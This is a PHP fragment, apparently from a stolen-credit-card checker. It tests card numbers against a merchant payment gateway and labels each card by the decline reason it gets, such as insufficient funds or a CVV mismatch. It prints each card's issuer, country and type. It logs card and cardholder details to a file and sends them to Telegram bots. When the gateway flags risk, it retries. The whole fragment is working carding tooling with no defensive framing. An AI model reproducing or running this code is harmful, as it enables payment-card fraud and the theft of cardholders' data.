$log_entry .= "*Lastname* : `" . $escaped_lname . "`\n";
$log_entry .= "*Street* : `" . $escaped_street . "`\n";
$log_entry .= "*City* : `" . $escaped_city . "`\n";
$log_entry .= "*State* : `" . $escaped_state . "`\n";
$log_entry .= "*Zip* : `" . $escaped_zip . "`\n";
$log_entry .= "*Country* : `" . $escaped_country . "`\n";
$log_entry .= "*Phone* : `" . $escaped_phone . "`\n";
$log_entry .= "*Email* : `" . $escaped_email . "`\n";

file_put_contents('cvvb3cc.txt', $log_entry, FILE_APPEND | LOCK_EX);
sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);
sendToTelegram($default_bot_token, $default_chat_id, $log_entry);
} elseif (strpos($Payment, "Insufficient Funds") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_ccn . ' ' . $lista . ' [' . $Respo . '] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
    
        // Adding the font style for #CVV
    if ($liabilityShifted !== null && strpos($liabilityShifted ? 'YES' : 'NO', 'YES') !== false) { 
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#PASSED ✅</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
} elseif ($liabilityShifted !== null) {
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#REJECTED ❌</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
}
        // Log CVV response to cvv.txt
    $log_entry = "CCN `" . $escaped_lista . "`\n";
    sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);


} elseif (strpos($Payment, "Card Issuer Declined") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_ccn . ' ' . $lista . ' [' . $Respo . '] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
    
if ($liabilityShifted !== null && strpos($liabilityShifted ? 'YES' : 'NO', 'YES') !== false) { 
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#PASSED ✅</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
} elseif ($liabilityShifted !== null) {
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#REJECTED ❌</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
}
    $log_entry = "CCN `" . $escaped_lista . "`\n";
    sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);

} elseif (strpos($Payment, "The card verification number does not match.") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_ccn . ' ' . $lista . ' [' . $Respo . '] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
    
if ($liabilityShifted !== null && strpos($liabilityShifted ? 'YES' : 'NO', 'YES') !== false) { 
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#PASSED ✅</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
} elseif ($liabilityShifted !== null) {
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#REJECTED ❌</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
}
    $log_entry = "CCN `" . $escaped_lista . "`\n";
    sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);

} elseif (strpos($Payment, "Insufficient funds in account") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_ccn . ' ' . $lista . ' [' . $Respo . '] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
    
if ($liabilityShifted !== null && strpos($liabilityShifted ? 'YES' : 'NO', 'YES') !== false) { 
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#PASSED ✅</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
} elseif ($liabilityShifted !== null) {
    echo '_________________________________________<br><br>';
    echo '<span style="' . $fontStyle . '">#REJECTED ❌</span><br>';
    echo '<span style="' . $fontStyle . '">CARD ⇾ </span>' . strtoupper($lista) . '<br>';
    echo '<span style="' . $fontStyle . '">RESPONSE ⇾ </span>' . strtoupper($status) . '<br><br>';
    echo '<span style="' . $fontStyle . '">INFO ⇾ </span>' . strtoupper($cardType);
    if ($debit === 'Yes') {
        echo ' ⇾ DEBIT';
    }
    if ($prepaid === 'Yes') {
        echo ' ⇾ PREPAID';
    }
    echo '<br><span style="' . $fontStyle . '">ISSUER ⇾ </span>' . strtoupper($issuingBank) . '<br>';
    echo '<span style="' . $fontStyle . '">COUNTRY ⇾ </span>' . strtoupper($countryOfIssuance) . '<br>';
    echo '<span style="' . $fontStyle . '">TIME ⇾ </span>' . $time_total . ' SECONDS<br><br>';
    echo '_________________________________________<br><br>';
}
    $log_entry = "CCN `" . $escaped_lista . "`\n";
    sendToTelegram($additional_bot_token, $additional_chat_id, $log_entry);

}
elseif(strpos($Payment, 'Gateway Rejected: risk_threshold' )) {
  $rekick++;
  goto goers;
} elseif (strpos($Payment, "We were unable to process your order, please try again.") !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [ NONCE ERROR ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
} elseif (strpos($Payment, '{"result":"failure","messages":"","refresh":false,"reload":true}') !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [ DECLINED ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
} elseif (strpos($Respo, 'Sorry, your session has expired. Return to shop') !== false) {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [ DECLINED ] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';
} else {
    echo '
        <div style="font-size: 14px;">
            ' . $badge_declined . ' ' . $lista . ' [' . $Respo . '] [AMOUNT: '.$price1.'] [' . $ip . '] <a href="' . $hostname1 . '" target="_blank">SITE</a> <br>
        </div>
    ';

}
?>